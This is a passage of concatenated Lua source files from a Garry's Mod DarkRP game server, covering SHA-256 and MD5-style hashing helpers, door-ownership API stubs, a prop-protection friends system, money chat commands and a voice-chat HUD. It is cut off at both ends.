	local bit_rshift 	= bit.rshift
	local bit_bnot		= bit.bnot

	local string_gsub 	= string.gsub
	local string_format = string.format
	local string_byte 	= string.byte
	local string_char   = string.char
	local string_rep	= string.rep


	local k = {
		0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
		0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
		0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
		0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
		0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
		0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
		0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
		0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
		0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
		0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
		0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
		0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
		0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
		0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
		0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
		0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
	}

	local function str2hexa (s)
		return string_gsub(s, ".", function(c)
			return string_format("%02x", string_byte(c))
		end)
	end

	local function num2s (l, n)
		local s = ""
		for i = 1, n do
			local rem = l % 256
			s = string_char(rem) .. s
			l = (l - rem) / 256
		end
		return s
	end

	local function s232num (s, i)
		local n = 0
		for i = i, i + 3 do
			n = n*256 + string_byte(s, i)
		end
		return n
	end

	local function preproc (msg, len)
		local extra = -(len + 1 + 8) % 64
		len = num2s(8 * len, 8)
		msg = msg .. "\128" .. string_rep("\0", extra) .. len
		return msg
	end

	local function initH256 (H)
		H[1] = 0x6a09e667
		H[2] = 0xbb67ae85
		H[3] = 0x3c6ef372
		H[4] = 0xa54ff53a
		H[5] = 0x510e527f
		H[6] = 0x9b05688c
		H[7] = 0x1f83d9ab
		H[8] = 0x5be0cd19
		return H
	end

	local function digestblock (msg, i, H)
		local w = {}
		for j = 1, 16 do
			w[j] = s232num(msg, i + (j - 1)*4)
		end

		for j = 17, 64 do
			local v = w[j - 15]
			local s0 = bit_bxor(bit_ror(v, 7), bit_ror(v, 18), bit_rshift(v, 3))
			v = w[j - 2]
			local s1 = bit_bxor(bit_ror(v, 17), bit_ror(v, 19), bit_rshift(v, 10))
			w[j] = w[j - 16] + s0 + w[j - 7] + s1
		end

		local a, b, c, d, e, f, g, h = H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8]

		for i = 1, 64 do
			local s0 = bit_bxor(bit_ror(a, 2), bit_ror(a, 13), bit_ror(a, 22))
			local maj = bit_bxor(bit_band(a, b), bit_band(a, c), bit_band(b, c))
			local t2 = s0 + maj
			local s1 = bit_bxor(bit_ror(e, 6), bit_ror(e, 11), bit_ror(e, 25))
			local ch = bit_bxor (bit_band(e, f), bit_band(bit_bnot(e), g))
			local t1 = h + s1 + ch + k[i] + w[i]

			h = g
			g = f
			f = e
			e = d + t1
			d = c
			c = b
			b = a
			a = t1 + t2
		end

		H[1] = bit_band(H[1] + a)
		H[2] = bit_band(H[2] + b)
		H[3] = bit_band(H[3] + c)
		H[4] = bit_band(H[4] + d)
		H[5] = bit_band(H[5] + e)
		H[6] = bit_band(H[6] + f)
		H[7] = bit_band(H[7] + g)
		H[8] = bit_band(H[8] + h)
	end

	local HH = {}
	function hash.SHA256(msg)
		msg = preproc(msg, #msg)
		local H = initH256(HH)
		for i = 1, #msg, 64 do
			digestblock(msg, i, H)
		end

		return str2hexa(num2s(H[1], 4)..num2s(H[2], 4)..num2s(H[3], 4)..num2s(H[4], 4)..num2s(H[5], 4)..num2s(H[6], 4)..num2s(H[7], 4)..num2s(H[8], 4))
	end
end

do
	local band = bit.band
	local bnot = bit.bnot
	local bor = bit.bor
	local bxor = bit.bxor
	local floor = math.floor

	// The four core functions - F1 is optimized somewhat
	// local function f1(x, y, z) bit.bor(bit.band(x, y), bit.band( bit.bnot( x), z)) end
	local function f1(x, y, z) return bxor( z, band( x, bxor( y, z))) end
	local function f2(x, y, z) return bxor( y, band( z, bxor( x, y))) end
	local function f3(x, y, z) return bxor(bxor( x, y), z) end
	local function f4(x, y, z) return bxor( y, bor( x, bnot( z))) end

	// This is the central step in the MD5 algorithm.
	local function Step(func, w, x, y, z, flData, iStep)
		w = w + func(x, y, z) + flData

		return bor((w * 2^iStep) % 0x100000000, floor(w % 0x100000000 / 2^(0x20 - iStep))) + x
	end

	-- This is called every tick so it has to be super optimised
	function hash.PseudoRandom(nSeed)
		nSeed = nSeed % 0x100000000

		local a = Step(f1, 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, nSeed + 0xd76aa478, 7)
		local d = Step(f1, 0x10325476, a, 0xefcdab89, 0x98badcfe, 0xe8c7b7d6, 12)
		local c = Step(f1, 0x98badcfe, d, a, 0xefcdab89, 0x242070db, 17)
		local b = Step(f1, 0xefcdab89, c, d, a, 0xc1bdceee, 22)
		a = Step(f1, a, b, c, d, 0xf57c0faf, 7)
		d = Step(f1, d, a, b, c, 0x4787c62a, 12)
		c = Step(f1, c, d, a, b, 0xa8304613, 17)
		b = Step(f1, b, c, d, a, 0xfd469501, 22)
		a = Step(f1, a, b, c, d, 0x698098d8, 7)
		d = Step(f1, d, a, b, c, 0x8b44f7af, 12)
		c = Step(f1, c, d, a, b, 0xffff5bb1, 17)
		b = Step(f1, b, c, d, a, 0x895cd7be, 22)
		a = Step(f1, a, b, c, d, 0x6b901122, 7)
		d = Step(f1, d, a, b, c, 0xfd987193, 12)
		c = Step(f1, c, d, a, b, 0xa67943ae, 17)
		b = Step(f1, b, c, d, a, 0x49b40821, 22)

		a = Step(f2, a, b, c, d, 0xf61e25e2, 5)
		d = Step(f2, d, a, b, c, 0xc040b340, 9)
		c = Step(f2, c, d, a, b, 0x265e5a51, 14)
		b = Step(f2, b, c, d, a, nSeed + 0xe9b6c7aa, 20)
		a = Step(f2, a, b, c, d, 0xd62f105d, 5)
		d = Step(f2, d, a, b, c, 0x02441453, 9)
		c = Step(f2, c, d, a, b, 0xd8a1e681, 14)
		b = Step(f2, b, c, d, a, 0xe7d3fbc8, 20)
		a = Step(f2, a, b, c, d, 0x21e1cde6, 5)
		d = Step(f2, d, a, b, c, 0xc33707f6, 9)
		c = Step(f2, c, d, a, b, 0xf4d50d87, 14)
		b = Step(f2, b, c, d, a, 0x455a14ed, 20)
		a = Step(f2, a, b, c, d, 0xa9e3e905, 5)
		d = Step(f2, d, a, b, c, 0xfcefa3f8, 9)
		c = Step(f2, c, d, a, b, 0x676f02d9, 14)
		b = Step(f2, b, c, d, a, 0x8d2a4c8a, 20)

		a = Step(f3, a, b, c, d, 0xfffa3942, 4)
		d = Step(f3, d, a, b, c, 0x8771f681, 11)
		c = Step(f3, c, d, a, b, 0x6d9d6122, 16)
		b = Step(f3, b, c, d, a, 0xfde5382c, 23)
		a = Step(f3, a, b, c, d, 0xa4beeac4, 4)
		d = Step(f3, d, a, b, c, 0x4bdecfa9, 11)
		c = Step(f3, c, d, a, b, 0xf6bb4b60, 16)
		b = Step(f3, b, c, d, a, 0xbebfbc70, 23)
		a = Step(f3, a, b, c, d, 0x289b7ec6, 4)
		d = Step(f3, d, a, b, c, nSeed + 0xeaa127fa, 11)
		c = Step(f3, c, d, a, b, 0xd4ef3085, 16)
		b = Step(f3, b, c, d, a, 0x04881d05, 23)
		a = Step(f3, a, b, c, d, 0xd9d4d039, 4)
		d = Step(f3, d, a, b, c, 0xe6db99e5, 11)
		c = Step(f3, c, d, a, b, 0x1fa27cf8, 16)
		b = Step(f3, b, c, d, a, 0xc4ac5665, 23)

		a = Step(f4, a, b, c, d, nSeed + 0xf4292244, 6)
		d = Step(f4, d, a, b, c, 0x432aff97, 10)
		c = Step(f4, c, d, a, b, 0xab9423c7, 15)
		b = Step(f4, b, c, d, a, 0xfc93a039, 21)
		a = Step(f4, a, b, c, d, 0x655b59c3, 6)
		d = Step(f4, d, a, b, c, 0x8f0ccc92, 10)
		c = Step(f4, c, d, a, b, 0xffeff47d, 15)
		b = Step(f4, b, c, d, a, 0x85845e51, 21)
		a = Step(f4, a, b, c, d, 0x6fa87e4f, 6)
		d = Step(f4, d, a, b, c, 0xfe2ce6e0, 10)
		c = Step(f4, c, d, a, b, 0xa3014314, 15)
		b = Step(f4, b, c, d, a, 0x4e0811a1, 21)
		a = Step(f4, a, b, c, d, 0xf7537e82, 6)
		d = Step(f4, d, a, b, c, 0xbd3af235, 10)
		c = (0x98badcfe + Step(f4, c, d, a, b, 0x2ad7d2bb, 15)) % 0x100000000
		b = (0xefcdab89 + Step(f4, b, c, d, a, 0xeb86d391, 21)) % 0x100000000

		return floor(b / 0x10000) % 0x100 + floor(b / 0x1000000) % 0x100 * 0x100 + c % 0x100 * 0x10000 + floor( c / 0x100) % 0x100 * 0x1000000
	end
end

--PATH gamemodes/darkrp/gamemode/modules/doorsystem/sh_interface.lua:
DarkRP.ENTITY.getDoorData = DarkRP.stub{
    name = "getDoorData",
    description = "Internal function to get the door/vehicle data.",
    parameters = {
    },
    returns = {
        {
            name = "doordata",
            description = "All the DarkRP information on a door or vehicle.",
            type = "table"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.isKeysOwnable = DarkRP.stub{
    name = "isKeysOwnable",
    description = "Whether this door can be bought.",
    parameters = {
    },
    returns = {
        {
            name = "answer",
            description = "Whether the door can be bought.",
            type = "boolean"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.isDoor = DarkRP.stub{
    name = "isDoor",
    description = "Whether this entity is considered a door in DarkRP.",
    parameters = {
    },
    returns = {
        {
            name = "answer",
            description = "Whether it's a door.",
            type = "boolean"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.isKeysOwned = DarkRP.stub{
    name = "isKeysOwned",
    description = "Whether this door is owned by someone.",
    parameters = {
    },
    returns = {
        {
            name = "answer",
            description = "Whether it's owned.",
            type = "boolean"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.getDoorOwner = DarkRP.stub{
    name = "getDoorOwner",
    description = "Get the owner of a door.",
    parameters = {
    },
    returns = {
        {
            name = "owner",
            description = "The owner of the door.",
            type = "Player"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.isMasterOwner = DarkRP.stub{
    name = "isMasterOwner",
    description = "Whether the player is the main owner of the door (as opposed to a co-owner).",
    parameters = {
        {
            name = "ply",
            description = "The player to query.",
            type = "Player",
            optional = false
        }
    },
    returns = {
        {
            name = "answer",
            description = "Whether this player is the master owner.",
            type = "boolean"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.isKeysOwnedBy = DarkRP.stub{
    name = "isKeysOwnedBy",
    description = "Whether this door is owned or co-owned by this player",
    parameters = {
        {
            name = "ply",
            description = "The player to query.",
            type = "Player",
            optional = false
        }
    },
    returns = {
        {
            name = "answer",
            description = "Whether this door is (co-)owned by the player.",
            type = "boolean"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.isKeysAllowedToOwn = DarkRP.stub{
    name = "isKeysAllowedToOwn",
    description = "Whether this player is allowed to co-own a door, as decided by the master door owner.",
    parameters = {
        {
            name = "ply",
            description = "The player to query.",
            type = "Player",
            optional = false
        }
    },
    returns = {
        {
            name = "answer",
            description = "Whether this door is (co-)ownable by the player.",
            type = "boolean"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.getKeysNonOwnable = DarkRP.stub{
    name = "getKeysNonOwnable",
    description = "Whether ownability of this door/vehicle is disabled.",
    parameters = {
    },
    returns = {
        {
            name = "title",
            description = "The ownability status.",
            type = "boolean"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.getKeysTitle = DarkRP.stub{
    name = "getKeysTitle",
    description = "Get the title of this door or vehicle.",
    parameters = {
    },
    returns = {
        {
            name = "title",
            description = "The title of the door or vehicle.",
            type = "string"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.getKeysDoorGroup = DarkRP.stub{
    name = "getKeysDoorGroup",
    description = "The door group of a door if it exists.",
    parameters = {
    },
    returns = {
        {
            name = "group",
            description = "The door group.",
            type = "string"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.getKeysDoorTeams = DarkRP.stub{
    name = "getKeysDoorTeams",
    description = "The teams that are allowed to open this door.",
    parameters = {
    },
    returns = {
        {
            name = "teams",
            description = "The door teams.",
            type = "table"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.getKeysAllowedToOwn = DarkRP.stub{
    name = "getKeysAllowedToOwn",
    description = "The list of people of which the master door owner has added as allowed to own.",
    parameters = {
    },
    returns = {
        {
            name = "players",
            description = "The list of people allowed to own.",
            type = "table"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.ENTITY.getKeysCoOwners = DarkRP.stub{
    name = "getKeysCoOwners",
    description = "The list of people who co-own the door.",
    parameters = {
    },
    returns = {
        {
            name = "players",
            description = "The list of people allowed to own. The keys of this table are UserIDs, the values are booleans.",
            type = "table"
        }
    },
    metatable = DarkRP.ENTITY
}

DarkRP.PLAYER.canKeysLock = DarkRP.stub{
    name = "canKeysLock",
    description = "Whether the player can lock a given door.",
    parameters = {
        {
            name = "door",
            description = "The door",
            optional = false,
            type = "Entity"
        }
    },
    returns = {
        {
            name = "allowed",
            description = "Whether the player is allowed to lock the door.",
            type = "boolean"
        }
    },
    metatable = DarkRP.PLAYER
}

DarkRP.PLAYER.canKeysUnlock = DarkRP.stub{
    name = "canKeysUnlock",
    description = "Whether the player can unlock a given door.",
    parameters = {
        {
            name = "door",
            description = "The door",
            optional = false,
            type = "Entity"
        }
    },
    returns = {
        {
            name = "allowed",
            description = "Whether the player is allowed to unlock the door.",
            type = "boolean"
        }
    },
    metatable = DarkRP.PLAYER
}

DarkRP.registerDoorVar = DarkRP.stub{
    name = "registerDoorVar",
    description = "Register a door variable by name. You should definitely register door variables. Registering DarkRPVars will make networking much more efficient.",
    parameters = {
        {
            name = "name",
            description = "The name of the door var.",
            type = "string",
            optional = false
        },
        {
            name = "writeFn",
            description = "The function that writes a value for this door var. Examples: net.WriteString, function(val) net.WriteUInt(val, 8) end.",
            type = "function",
            optional = false
        },
        {
            name = "readFn",
            description = "The function that reads and returns a value for this door var. Examples: net.ReadString, function() return net.ReadUInt(8) end.",
            type = "function",
            optional = false
        }
    },
    returns = {
    },
    metatable = DarkRP
}

DarkRP.getDoorVars = DarkRP.stub{
    name = "getDoorVars",
    description = "Internal function, retrieves all the registered door variables.",
    parameters = {

    },
    returns = {
        {
            name = "doorvars",
            description = "The door variables, indexed by number",
            type = "table"
        }
    },
    metatable = DarkRP
}

DarkRP.getDoorVarsByName = DarkRP.stub{
    name = "getDoorVarsByName",
    description = "Internal function, retrieves all the registered door variables, indeded by their names.",
    parameters = {

    },
    returns = {
        {
            name = "doorvars",
            description = "The door variables, indexed by name",
            type = "table"
        }
    },
    metatable = DarkRP
}

DarkRP.hookStub{
    name = "canKeysLock",
    description = "Whether the player can lock a given door. This hook is run when ply:canKeysLock is called.",
    parameters = {
        {
            name = "ply",
            description = "The player",
            type = "Player"
        },
        {
            name = "door",
            description = "The door",
            type = "Entity"
        }
    },
    returns = {
        {
            name = "allowed",
            description = "Whether the player is allowed to lock the door.",
            type = "boolean"
        }
    }
}

DarkRP.hookStub{
    name = "canKeysUnlock",
    description = "Whether the player can unlock a given door. This hook is run when ply:canKeysUnlock is called.",
    parameters = {
        {
            name = "ply",
            description = "The player",
            type = "Player"
        },
        {
            name = "door",
            description = "The door",
            type = "Entity"
        }
    },
    returns = {
        {
            name = "allowed",
            description = "Whether the player is allowed to unlock the door.",
            type = "boolean"
        }
    }
}

--PATH gamemodes/darkrp/gamemode/modules/pp/sh_cppi.lua:
-- PP ENUMS
CPPI_TOOLGUN = 1
CPPI_PHYSGUN = 2
CPPI_PROPERTY = 3
CPPI_PUSH = 4

CPPI = CPPI or {}
CPPI.CreditFormat = "%s CPPI.\n(C) GambitRP Team"

local PLAYER = FindMetaTable( "Player" )
local ENTITY = FindMetaTable( "Entity" )

-- Get name
function CPPI:GetName()
	return "Developer: @mcstark"
end

function CPPI:GetCredits()
	return self.CreditFormat:format( self:GetName() )
end

function CPPI:PrintLogo()
	print( string.format( '=============================================\n%s\n=============================================', self:GetCredits() ) )
end

CPPI:PrintLogo()

-- Get interface version of CPPI
function CPPI:GetInterfaceVersion()
	return 1.0
end

-- Get version of CPPI
function CPPI:GetVersion()
	return tostring( self:GetInterfaceVersion() )
end

-- Get name from UID
function CPPI:GetNameFromSID( sid )
	return player.GetBySteamID(sid or "")
end

-- Get friends from a player
function PLAYER:CPPIGetFriends()
	return self.CPPI_Friends or {}
end

-- Get the owner of an entity
function ENTITY:CPPIGetOwner()
	return self:GetNW2Entity( 'CPPI_Owner' )
end

if CLIENT then

	CPPI.Friends = {}

	hook.Add( 'HUDPaint', 'CPPIOwnerDisplay', function()
		
		local ent = LocalPlayer():GetEyeTrace().Entity
		
		if IsValid( ent ) then
			
			local owner = ent:CPPIGetOwner()
			
			local owner_name = "World"
			
			if IsValid( owner ) then
				
				owner_name = owner:GetName()
				
			end
			
			draw.WordBox( 4, 3, ScrH() * 0.48, owner_name, "Default", Color( 0, 0, 0, 140 ), Color( 255,255,255 ) )
			
		end
		
	end)
	
	net.Receive( 'cppi_friends', function()
		CPPI.Friends = net.ReadTable()
	end)
	
	local menu, header, listbox
	
	function CPPI.FriendsMenu()
		if IsValid( menu ) then menu:Remove() end
		
		menu = vgui.Create( "DFrame" )
		menu:SetSize( 300, 400 )
		menu:SetPos( 5, ScrH() * 0.5 - 200 )
		menu:SetTitle( '' )
		
		header = menu:Add( "DPanel" )
		header:Dock( TOP )
		header:SetTall( 50 )
		
		header.PaintOver = function( self, w, h )
			draw.DrawText( 'Друзья', 'HUDSELECTIONTEXT', 5, 5, Color( 0,0,0 ) )
			draw.DrawText( 'Разрешить доступ к своим предметам', 'DermaDefault', 5, 20, Color( 0,0,0 ) )
		end
		
		listbox = menu:Add( "DListView" )
		listbox:Dock(FILL)
		listbox:AddColumn(""):SetFixedWidth( 24 )
		listbox:AddColumn("")
		listbox:SetDataHeight( 24 )
	
		listbox.VBar:SetWide(4) 
		
		function listbox:AddPlayer(ply)
			
			local line = self:AddLine( "", ply:GetName() )
			
			local av, profile, isfriend
			
			av = line:Add( 'AvatarImage' )
			av:SetPos( 3, 3 )
			av:SetSize( 18, 18 )
			av:SetPlayer( ply )
			
			profile = av:Add( "DButton" )
			profile:Dock(FILL)
			profile:SetText("")
			profile.Paint = nil
			
			profile.DoClick = function()
				ply:ShowProfile()
			end
			
			isfriend = line:Add( "DButton" )
			isfriend:Dock( RIGHT )
			isfriend:DockMargin( 2, 2, 14, 2 )
			isfriend:SetText("")
			isfriend:SetWide( 18 )
			
			isfriend.Paint = function(_,w,h)
				local ico = Material( 'icon16/bullet_red.png' )
				
				if CPPI.Friends[ ply ] then
					ico = Material( 'icon16/tick.png' )
				end
				
				surface.SetMaterial( ico )
				surface.SetDrawColor( 255,255,255,255 )
				surface.DrawTexturedRect( 1, 1, 16, 16 )
			end
			
			isfriend.DoClick = function()
				RunConsoleCommand( 'cppi_' .. ( CPPI.Friends[ ply ] and 'remove' or 'add' ) ..'friend', ply:SteamID() )
			end
			
		end
		
		for k,v in ipairs( player.GetHumans() ) do
			
			listbox:AddPlayer( v )
			
		end
		
	end
	
	concommand.Add( 'cppi_friends', CPPI.FriendsMenu )
	
	return
end

util.AddNetworkString( 'cppi_friends' )

DarkRPEntities_v2 = {}

function CPPI.SetupOwner( self, owner )
	local sid = owner:SteamID()
	DarkRPEntities_v2[sid] = DarkRPEntities_v2[sid] or { OwnerName = owner:GetName(), Entities = {} }
	table.insert(DarkRPEntities_v2[sid].Entities, self)
	
	self:SetNW2Entity( "CPPI_Owner", owner )
	self.OwnerID = (IsValid( owner ) and owner:IsPlayer()) and owner:SteamID() or "world"
end

function CPPI.OwnEntity( ent, owner )
	CPPI.SetupOwner( ent, owner )
	table.foreach( constraint.GetAllConstrainedEntities( ent ), function( _, cent )
		if cent:CPPIGetOwner() then return end
		CPPI.SetupOwner( cent, owner )
	end )
end

function PLAYER:UpdateFriends()
	net.Start( 'cppi_friends' )
	net.WriteTable( self.Friends or {} )
	net.Send( self )
end

function PLAYER:CheckFriend( ply )
	self.Friends = self.Friends or {}
	return self.Friends[ply] == true
end

function PLAYER:AddFriend( ply )
	self.Friends = self.Friends or {}
	self.Friends[ply] = true
	
	self:UpdateFriends()
end

function PLAYER:RemoveFriend( ply )
	self.Friends = self.Friends or {}
	self.Friends[ply] = nil
	
	self:UpdateFriends()
end

concommand.Add( 'cppi_addfriend', function( ply, _, args )
	if ply.cppi_cmdcd and ply.cppi_cmdcd > CurTime() then return end
	local sid = args[1]
	local pl = player.GetBySteamID( sid )
	if IsValid( pl ) and pl:IsPlayer() then
		ply:AddFriend( pl )
	end
	
	ply.cppi_cmdcd = CurTime() + 1
end)

concommand.Add( 'cppi_removefriend', function( ply, _, args )
	if ply.cppi_cmdcd and ply.cppi_cmdcd > CurTime() then return end
	local sid = args[1]
	local pl = player.GetBySteamID( sid )
	if IsValid( pl ) and pl:IsPlayer() then
		ply:RemoveFriend( pl )
	end
	
	ply.cppi_cmdcd = CurTime() + 1
end)

function ENTITY:CPPISetOwner( ply )
	return CPPI.OwnEntity( self, ply )
end

-- Physgun Access
function ENTITY:CPPICanPhysgun( ply )
	return CPPI.CanAccess( CPPI_PHYSGUN, ply, self )
end

-- Can tool
function ENTITY:CPPICanTool( ply, tool )
	return CPPI.CanAccess( CPPI_TOOLGUN, ply, self, tool )
end

-- Can punt
function ENTITY:CPPICanPunt( ply )
	return CPPI.CanAccess( CPPI_PUSH, ply, self )
end

-- Can Use
function ENTITY:CPPICanPickup( ply )
	return true -- why not
end


--PATH gamemodes/darkrp/gamemode/modules/money/sh_commands.lua:
DarkRP.declareChatCommand{
    command = "give",
    description = "Give money to the player you're looking at.",
    delay = 1.5
}

DarkRP.declareChatCommand{
    command = "dropmoney",
    description = "Drop money on the floor.",
    delay = 1.5
}

DarkRP.declareChatCommand{
    command = "moneydrop",
    description = "Drop money on the floor.",
    delay = 1.5
}

DarkRP.declareChatCommand{
    command = "setmoney",
    description = "Set a player's wallet value.",
    delay = 0.5,
    tableArgs = true
}

DarkRP.declareChatCommand{
    command = "addmoney",
    description = "Add money to a player's wallet.",
    delay = 0.5,
    tableArgs = true
}

--PATH gamemodes/darkrp/gamemode/modules/base/sh_playerclass.lua:
local PLAYER_CLASS = {}

-- Value of -1 = set to config value, if a corresponding setting exists
PLAYER_CLASS.DisplayName = "DarkRP Base Player Class"
PLAYER_CLASS.WalkSpeed = -1
PLAYER_CLASS.RunSpeed = -1
PLAYER_CLASS.DuckSpeed = 0.3
PLAYER_CLASS.UnDuckSpeed = 0.3
PLAYER_CLASS.TeammateNoCollide = false
PLAYER_CLASS.StartHealth = -1

function PLAYER_CLASS:Loadout()
    -- Let gamemode decide
end

function PLAYER_CLASS:SetModel()
    -- Let gamemode decide
end

function PLAYER_CLASS:ShouldDrawLocal()
    -- Let gamemode decide
end

function PLAYER_CLASS:CreateMove(cmd)
    -- Let gamemode decide
end

function PLAYER_CLASS:CalcView(view)
    -- Let gamemode decide
end

function PLAYER_CLASS:GetHandsModel()
    -- Let gamemode decide
end

function PLAYER_CLASS:StartMove(mv, cmd)
    -- Let gamemode decide
end

function PLAYER_CLASS:FinishMove(mv)
    -- Let gamemode decide
end

player_manager.RegisterClass("player_darkrp", PLAYER_CLASS, "player_sandbox")

--PATH addons/111mod/lua/darkrp_modules/vote/sh_roll.lua:
DarkRP.declareChatCommand{
	command = "roll",
	description = "Кинуть кубик.",
	delay = 1.5
}

if SERVER then
	DarkRP.defineChatCommand("roll", function(ply, n)
		n = tonumber(n) or 2
		DarkRP.talkToRange(ply, "[Результат]", ("%s кидает кубик с числом (%d). Выпало число %d."):format(ply:Name(), n, math.random(1, n)), 250)
		return ""
	end)
end
--PATH addons/111mod/lua/darkrp_modules/vote/cl_voice_meter.lua:
surface.CreateFont( "VoiceMeter_VoiceFont", {
 font = "Arial",
 size = VoiceChatMeter.FontSize or 17,
 weight = 550,
 blursize = 0,
 scanlines = 0,
 antialias = true,
 underline = false,
 italic = false,
 strikeout = false,
 symbol = false,
 rotary = false,
 shadow = true,
 additive = false,
 outline = true
} )

/*---------------------------------------------------------------------------
           Starting DarkRP specific stuff
---------------------------------------------------------------------------*/
surface.CreateFont ("DarkRPHUD1", { // Just incase the font doesn't exist
size = 16,
weight = 600,
antialias = true,
shadow = true,
font = "DejaVu Sans"})

local receivers
local currentChatText = {}
local receiverConfigs = {
	[""] = { -- The default config decides who can hear you when you speak normally
		text = "talk",
		hearFunc = function(ply)
			--if GAMEMODE.Config.alltalk then return nil end

			return LocalPlayer():GetPos():Distance(ply:GetPos()) < 250
		end
	}
}

local currentConfig = receiverConfigs[""] -- Default config is normal talk

local function AddChatReceiver(prefix, text, hearFunc)
	receiverConfigs[prefix] = {
		text = text,
		hearFunc = hearFunc
	}
end

AddChatReceiver("speak", "speak", function(ply)
	if not LocalPlayer().DRPIsTalking then return nil end
	if LocalPlayer():GetPos():Distance(ply:GetPos()) > 550 then return false end

	return ((ply.IsInRoom and ply:IsInRoom()) or (ply.isInRoom and ply:isInRoom()))
end)

local function drawChatReceivers()
	if not receivers then return end

	local x, y = chat.GetChatBoxPos()
	y = y - 21

	-- No one hears you
	if #receivers == 0 then
		--draw.WordBox(2, x, y, "Noone can hear you speak", "DarkRPHUD1", Color(0,0,0,160), Color(255,0,0,255))
		return
	-- Everyone hears you
	elseif #receivers == #player.GetAll() - 1 then
		--draw.WordBox(2, x, y, "Everyone can hear you speak", "DarkRPHUD1", Color(0,0,0,160), Color(0,255,0,255))
		return
	end

	--draw.WordBox(2, x, y - (#receivers * 21), "Players who can hear you speak:", "DarkRPHUD1", Color(0,0,0,160), Color(0,255,0,255))
	for i = 1, #receivers, 1 do
		if not IsValid(receivers[i]) then
			receivers[i] = receivers[#receivers]
			receivers[#receivers] = nil
			continue
		end

		--draw.WordBox(2, x, y - (i - 1)*21, receivers[i]:Nick(), "DarkRPHUD1", Color(0,0,0,160), Color(255,255,255,255))
	end
end

local function chatGetRecipients()
	if not currentConfig then return end

	receivers = {}
	for _, ply in player.Iterator() do
		if not IsValid(ply) or ply == LocalPlayer() then continue end

		local val = currentConfig.hearFunc(ply, currentChatText)

		-- Return nil to disable the chat recipients temporarily.
		if val == nil then
			receivers = nil
			return
		elseif val == true then
			table.insert(receivers, ply)
		end
	end
end
/*---------------------------------------------------------------------------
            End DarkRP Specific stuff
---------------------------------------------------------------------------*/

VoiceMeter = {}
VoiceMeter.Talking = {}

function VoiceMeter.StartVoice(ply)
	if !ply:IsValid() or !ply.Team then return end
	for k,v in pairs(VoiceMeter.Talking) do if v.Owner == ply then v:Remove() VoiceMeter.Talking[k] = nil break end end
	
	if DarkRP and ply == LocalPlayer() then
		ply.DRPIsTalking = true
		currentConfig = receiverConfigs["speak"]
		hook.Add("Think", "DarkRP_chatRecipients", chatGetRecipients)
		hook.Add("HUDPaint", "DarkRP_DrawChatReceivers", drawChatReceivers)
		if !VoiceChatMeter.DarkRPSelfSquare then return end // No squares for yourself in DarkRP
	end
	
	local CurID = 1
	local W,H = VoiceChatMeter.SizeX or 250,VoiceChatMeter.SizeY or 40
	local TeamClr,CurName = team.GetColor(ply:Team()),ply:Name()
	
	// TTT Specific stuff
	if VOICE and VOICE.SetSpeaking then
		local client = LocalPlayer()
		if ply:IsActiveDetective() then
			TeamClr = Color(0,0,200)
		end
		if client == ply then
			if client:IsActiveTraitor() then
				if (not client:KeyDown(IN_SPEED)) and (not client:KeyDownLast(IN_SPEED)) then
					client.traitor_gvoice = true
					RunConsoleCommand("tvog", "1")
				else
					client.traitor_gvoice = false
					RunConsoleCommand("tvog", "0")
				end
			end
			VOICE.SetSpeaking(true)
		end
		if ply:IsActiveTraitor() and (!ply.traitor_gvoice) then
			TeamClr = Color(180,0,0)
		end
	end
	// End TTT specific stuff
	
	// The name panel itself
	local ToAdd = 0
	
	if #VoiceMeter.Talking != 0 then 
		for i=1,#VoiceMeter.Talking+3 do
			if !VoiceMeter.Talking[i] or !VoiceMeter.Talking[i]:IsValid() then
				ToAdd = -(i-1)*(H+4)
				CurID = i
				break
			end
		end
	end
	
	if !VoiceChatMeter.StackUp then ToAdd = -ToAdd end
	
	local NameBar,Fade,Go = vgui.Create("DPanel"),0,1
	NameBar:SetSize(W,H)
	local StartPos = (VoiceChatMeter.SlideOut and ((VoiceChatMeter.PosX < .5 and -W) or ScrW())) or (ScrW()*VoiceChatMeter.PosX-(VoiceChatMeter.Align == 1 and 0 or W))
	NameBar:SetPos(StartPos,ScrH()*VoiceChatMeter.PosY+ToAdd)
	if VoiceChatMeter.SlideOut then NameBar:MoveTo((ScrW()*VoiceChatMeter.PosX-(VoiceChatMeter.Align == 1 and 0 or W)),ScrH()*VoiceChatMeter.PosY+ToAdd,VoiceChatMeter.SlideTime) end
	NameBar.Paint = function(s,w,h)
		draw.RoundedBox(VoiceChatMeter.Radius,0,0,w,h,Color(TeamClr.r,TeamClr.g,TeamClr.b,180*Fade))
